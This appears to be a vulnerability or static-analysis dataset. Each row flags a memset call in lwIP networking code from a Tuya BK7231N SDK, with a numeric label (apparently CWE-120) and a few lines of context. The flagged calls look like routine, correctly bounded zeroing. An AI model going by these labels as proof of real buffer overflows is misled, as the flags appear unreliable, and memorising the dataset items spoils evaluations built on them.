2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,"memset(&node_instance, 0, sizeof(node_instance));",120,1,"  err_t err;
  struct snmp_node_instance node_instance;
  memset(&node_instance, 0, sizeof(node_instance));

  if (get_next) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,"memset(request->msg_authentication_parameters, 0, SNMP_V3_MAX_AUTH_PARAM_LENGTH);",120,1,"
    /* msgAuthenticationParameters */
    memset(request->msg_authentication_parameters, 0, SNMP_V3_MAX_AUTH_PARAM_LENGTH);
    IF_PARSE_EXEC(snmp_asn1_dec_tlv(&pbuf_stream, &tlv));
    IF_PARSE_ASSERT(tlv.type == SNMP_ASN1_TYPE_OCTET_STRING);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,"memset(request->msg_privacy_parameters, 0, SNMP_V3_MAX_PRIV_PARAM_LENGTH);",120,1,"
    /* msgPrivacyParameters */
    memset(request->msg_privacy_parameters, 0, SNMP_V3_MAX_PRIV_PARAM_LENGTH);
    IF_PARSE_EXEC(snmp_asn1_dec_tlv(&pbuf_stream, &tlv));
    IF_PARSE_ASSERT(tlv.type == SNMP_ASN1_TYPE_OCTET_STRING);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_threadsync.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_threadsync.c,"memset(&call_data->proxy_instance, 0, sizeof(call_data->proxy_instance));",120,1,"  }

  memset(&call_data->proxy_instance, 0, sizeof(call_data->proxy_instance));

  instance->reference.ptr = call_data;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\sntp\sntp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\sntp\sntp.c,"memset(req, 0, SNTP_MSG_LEN);",120,1,"sntp_initialize_request(struct sntp_msg *req)
{
  memset(req, 0, SNTP_MSG_LEN);
  req->li_vn_mode = SNTP_LI_NO_WARNING | SNTP_VERSION | SNTP_MODE_CLIENT;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\dns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\dns.c,"memset(&hdr, 0, SIZEOF_DNS_HDR);",120,1,"    u16_t dst_port;
    /* fill dns header */
    memset(&hdr, 0, SIZEOF_DNS_HDR);
    hdr.id = lwip_htons(entry->txid);
    hdr.flags1 = DNS_FLAG1_RD;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\mem.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\mem.c,"memset((u8_t*)ret + size, 0xcd, memp_pools[poolnr]->size - size);",120,1,"#if MEMP_OVERFLOW_CHECK
  /* initialize unused memory (diff between requested size and selected pool's size) */
  memset((u8_t*)ret + size, 0xcd, memp_pools[poolnr]->size - size);
#endif /* MEMP_OVERFLOW_CHECK */
  return ret;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\mem.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\mem.c,"memset(p, 0, (size_t)count * (size_t)size);",120,1,"  if (p) {
    /* zero the memory */
    memset(p, 0, (size_t)count * (size_t)size);
  }
  return p;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\memp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\memp.c,"memset(m, 0xcd, MEMP_SANITY_REGION_BEFORE_ALIGNED);",120,1,"#if MEMP_SANITY_REGION_BEFORE_ALIGNED > 0
  m = (u8_t*)p + MEMP_SIZE - MEMP_SANITY_REGION_BEFORE_ALIGNED;
  memset(m, 0xcd, MEMP_SANITY_REGION_BEFORE_ALIGNED);
#endif
#if MEMP_SANITY_REGION_AFTER_ALIGNED > 0
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\memp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\memp.c,"memset(m, 0xcd, MEMP_SANITY_REGION_AFTER_ALIGNED);",120,1,"#if MEMP_SANITY_REGION_AFTER_ALIGNED > 0
  m = (u8_t*)p + MEMP_SIZE + desc->size;
  memset(m, 0xcd, MEMP_SANITY_REGION_AFTER_ALIGNED);
#endif
#else /* MEMP_SANITY_REGION_BEFORE_ALIGNED > 0 || MEMP_SANITY_REGION_AFTER_ALIGNED > 0 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\netif.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\netif.c,"memset(netif->client_data, 0, sizeof(netif->client_data));",120,1,"  netif->flags = 0;
#ifdef netif_get_client_data
  memset(netif->client_data, 0, sizeof(netif->client_data));
#endif /* LWIP_NUM_NETIF_CLIENT_DATA */
#if LWIP_IPV6_AUTOCONFIG
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\raw.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\raw.c,"memset(pcb, 0, sizeof(struct raw_pcb));",120,1,"  if (pcb != NULL) {
    /* initialize PCB to all zeroes */
    memset(pcb, 0, sizeof(struct raw_pcb));
    pcb->protocol = proto;
    pcb->ttl = RAW_TTL;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\tcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\tcp.c,"memset(pcb, 0, sizeof(struct tcp_pcb));",120,1,"  if (pcb != NULL) {
    /* zero out the whole pcb, so there is no need to initialize members to zero */
    memset(pcb, 0, sizeof(struct tcp_pcb));
    pcb->prio = prio;
    pcb->snd_buf = TCP_SND_BUF;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\udp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\udp.c,"memset(pcb, 0, sizeof(struct udp_pcb));",120,1,"     * (recommended as default by RFC 3828). */
    /* initialize PCB to all zeroes */
    memset(pcb, 0, sizeof(struct udp_pcb));
    pcb->ttl = UDP_TTL;
#if LWIP_MULTICAST_TX_OPTIONS
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\autoip.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\autoip.c,"memset(autoip, 0, sizeof(struct autoip));",120,1,"
  /* clear data structure */
  memset(autoip, 0, sizeof(struct autoip));
  /* autoip->state = AUTOIP_STATE_OFF; */
  netif_set_client_data(netif, LWIP_NETIF_CLIENT_DATA_INDEX_AUTOIP, autoip);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,"#define dhcp_clear_all_options(dhcp)          (memset(dhcp_rx_options_given, 0, sizeof(dhcp_rx_options_given)))",120,1,"#define dhcp_got_option(dhcp, idx)            (dhcp_rx_options_given[idx] = 1)
#define dhcp_clear_option(dhcp, idx)          (dhcp_rx_options_given[idx] = 0)
#define dhcp_clear_all_options(dhcp)          (memset(dhcp_rx_options_given, 0, sizeof(dhcp_rx_options_given)))
#define dhcp_get_option_value(dhcp, idx)      (dhcp_rx_options_val[idx])
#define dhcp_set_option_value(dhcp, idx, val) (dhcp_rx_options_val[idx] = (val))
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,"memset(dhcp, 0, sizeof(struct dhcp));",120,1,"
  /* clear data structure */
  memset(dhcp, 0, sizeof(struct dhcp));
  /* dhcp_set_state(&dhcp, DHCP_STATE_OFF); */
  netif_set_client_data(netif, LWIP_NETIF_CLIENT_DATA_INDEX_DHCP, dhcp);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\dhcp.c,"memset(&dhcp, 0, sizeof(struct dhcp));",120,1,"  }

  memset(&dhcp, 0, sizeof(struct dhcp));
  dhcp_set_state(&dhcp, DHCP_STATE_INFORMING);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\ip4.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\ip4.c,"memset(((char*)p->payload) + optlen, 0, optlen_aligned - optlen);",120,1,"      if (optlen < optlen_aligned) {
        /* zero the remaining bytes */
        memset(((char*)p->payload) + optlen, 0, optlen_aligned - optlen);
      }
#if CHECKSUM_GEN_IP_INLINE
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\ip4_frag.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv4\ip4_frag.c,"memset(ipr, 0, sizeof(struct ip_reassdata));",120,1,"    }
  }
  memset(ipr, 0, sizeof(struct ip_reassdata));
  ipr->timer = IP_REASS_MAXAGE;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv6\ip6_frag.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\core\ipv6\ip6_frag.c,"memset(ipr, 0, sizeof(struct ip6_reassdata));",120,1,"    }

    memset(ipr, 0, sizeof(struct ip6_reassdata));
    ipr->timer = IP_REASS_MAXAGE;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\include\lwip\sockets.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\include\lwip\sockets.h,"#define FD_ZERO(p)    os_memset((void*)(p), 0, sizeof(*(p)))",120,1,"#define FD_CLR(n, p)  FDSETSAFESET(n, (p)->fd_bits[((n)-LWIP_SOCKET_OFFSET)/8] &= ~(1 << (((n)-LWIP_SOCKET_OFFSET) & 7)))
#define FD_ISSET(n,p) FDSETSAFEGET(n, (p)->fd_bits[((n)-LWIP_SOCKET_OFFSET)/8] &   (1 << (((n)-LWIP_SOCKET_OFFSET) & 7)))
#define FD_ZERO(p)    os_memset((void*)(p), 0, sizeof(*(p)))

typedef struct fd_set
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(wo, 0, sizeof(*wo));",120,1,"
#if 0 /* Not necessary, everything is cleared in ppp_new() */
    memset(wo, 0, sizeof(*wo));
    memset(go, 0, sizeof(*go));
    memset(ao, 0, sizeof(*ao));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(go, 0, sizeof(*go));",120,1,"#if 0 /* Not necessary, everything is cleared in ppp_new() */
    memset(wo, 0, sizeof(*wo));
    memset(go, 0, sizeof(*go));
    memset(ao, 0, sizeof(*ao));
    memset(ho, 0, sizeof(*ho));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(ao, 0, sizeof(*ao));",120,1,"    memset(wo, 0, sizeof(*wo));
    memset(go, 0, sizeof(*go));
    memset(ao, 0, sizeof(*ao));
    memset(ho, 0, sizeof(*ho));
#endif /* 0 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(ho, 0, sizeof(*ho));",120,1,"    memset(go, 0, sizeof(*go));
    memset(ao, 0, sizeof(*ao));
    memset(ho, 0, sizeof(*ho));
#endif /* 0 */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(&no, 0, sizeof(no));",120,1,"#endif /* !MPPE_SUPPORT && !DEFLATE_SUPPORT && !BSDCOMPRESS_SUPPORT */

    memset(&no, 0, sizeof(no));
    try_ = *go;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ccp.c,"memset(ho, 0, sizeof(ccp_options));",120,1,"    len = *lenp;

    memset(ho, 0, sizeof(ccp_options));
    ho->method = (len > 0)? p[0]: 0;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,"memset(&pcb->chap_client, 0, sizeof(chap_client_state));",120,1,"
#if 0 /* Not necessary, everything is cleared in ppp_new() */
	memset(&pcb->chap_client, 0, sizeof(chap_client_state));
#if PPP_SERVER
	memset(&pcb->chap_server, 0, sizeof(chap_server_state));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,"memset(&pcb->chap_server, 0, sizeof(chap_server_state));",120,1,"	memset(&pcb->chap_client, 0, sizeof(chap_client_state));
#if PPP_SERVER
	memset(&pcb->chap_server, 0, sizeof(chap_server_state));
#endif /* PPP_SERVER */
#endif /* 0 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,"memset(secret, 0, sizeof(secret));",120,1,"	ok = digest->verify_response(pcb, id, name, secret, secret_len, challenge,
				     response, message, message_space);
	memset(secret, 0, sizeof(secret));

	return ok;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\chap-new.c,"memset(secret, 0, secret_len);",120,1,"	pcb->chap_client.digest->make_response(pcb, outp, id, pcb->chap_client.name, pkt,
				  secret, secret_len, pcb->chap_client.priv);
	memset(secret, 0, secret_len);

	clen = *outp;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,"memset(&ecp_wantoptions[unit],  0, sizeof(ecp_options));",120,1,"
#if 0 /* Not necessary, everything is cleared in ppp_new() */
    memset(&ecp_wantoptions[unit],  0, sizeof(ecp_options));
    memset(&ecp_gotoptions[unit],   0, sizeof(ecp_options));
    memset(&ecp_allowoptions[unit], 0, sizeof(ecp_options));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,"memset(&ecp_gotoptions[unit],   0, sizeof(ecp_options));",120,1,"#if 0 /* Not necessary, everything is cleared in ppp_new() */
    memset(&ecp_wantoptions[unit],  0, sizeof(ecp_options));
    memset(&ecp_gotoptions[unit],   0, sizeof(ecp_options));
    memset(&ecp_allowoptions[unit], 0, sizeof(ecp_options));
    memset(&ecp_hisoptions[unit],   0, sizeof(ecp_options));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,"memset(&ecp_allowoptions[unit], 0, sizeof(ecp_options));",120,1,"    memset(&ecp_wantoptions[unit],  0, sizeof(ecp_options));
    memset(&ecp_gotoptions[unit],   0, sizeof(ecp_options));
    memset(&ecp_allowoptions[unit], 0, sizeof(ecp_options));
    memset(&ecp_hisoptions[unit],   0, sizeof(ecp_options));
#endif /* 0 */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ecp.c,"memset(&ecp_hisoptions[unit],   0, sizeof(ecp_options));",120,1,"    memset(&ecp_gotoptions[unit],   0, sizeof(ecp_options));
    memset(&ecp_allowoptions[unit], 0, sizeof(ecp_options));
    memset(&ecp_hisoptions[unit],   0, sizeof(ecp_options));
#endif /* 0 */

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,"memset(pcb, 0, sizeof(ppp_pcb));",120,1,"  }

  memset(pcb, 0, sizeof(ppp_pcb));

  /* default configuration */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,"memset(&pcb->mppe_comp, 0, sizeof(pcb->mppe_comp));",120,1,"#if MPPE_SUPPORT
  pcb->mppe_keys_set = 0;
  memset(&pcb->mppe_comp, 0, sizeof(pcb->mppe_comp));
  memset(&pcb->mppe_decomp, 0, sizeof(pcb->mppe_decomp));
#endif /* MPPE_SUPPORT */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\ppp.c,"memset(&pcb->mppe_decomp, 0, sizeof(pcb->mppe_decomp));",120,1,"  pcb->mppe_keys_set = 0;
  memset(&pcb->mppe_comp, 0, sizeof(pcb->mppe_comp));
  memset(&pcb->mppe_decomp, 0, sizeof(pcb->mppe_decomp));
#endif /* MPPE_SUPPORT */
#if VJ_SUPPORT
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppoe.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppoe.c,"memset(sc, 0, sizeof(struct pppoe_softc));",120,1,"  }

  memset(sc, 0, sizeof(struct pppoe_softc));
  sc->pcb = ppp;
  sc->sc_ethif = ethif;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppol2tp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppol2tp.c,"memset(l2tp, 0, sizeof(pppol2tp_pcb));",120,1,"  }

  memset(l2tp, 0, sizeof(pppol2tp_pcb));
  l2tp->phase = PPPOL2TP_STATE_INITIAL;
  l2tp->ppp = ppp;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppos.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppos.c,"memset(pppos, 0, sizeof(pppos_pcb));",120,1,"  }

  memset(pppos, 0, sizeof(pppos_pcb));
  pppos->ppp = ppp;
  pppos->output_cb = output_cb;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppos.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\pppos.c,"memset(&pppos->last_xmit, 0, sizeof(pppos_pcb) - offsetof(pppos_pcb, last_xmit));",120,1,"
  /* reset PPPoS control block to its initial state */
  memset(&pppos->last_xmit, 0, sizeof(pppos_pcb) - offsetof(pppos_pcb, last_xmit));

  /*
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\vj.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\netif\ppp\vj.c,"memset((char *)comp, 0, sizeof(*comp));",120,1,"
#if MAX_SLOTS == 0
  memset((char *)comp, 0, sizeof(*comp));
#endif
  comp->maxSlotIndex = MAX_SLOTS - 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_mem.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_mem.c,"memset(p, 0, sizeof(p));",120,1,"   void* p[16];
   LWIP_ASSERT(""invalid size"", size >= 0 && size < (mem_size_t)-1);
   memset(p, 0, sizeof(p));
   for(i = 0; i < num && i < 16; i++) {
      p[i] = mem_malloc((mem_size_t)size);
"
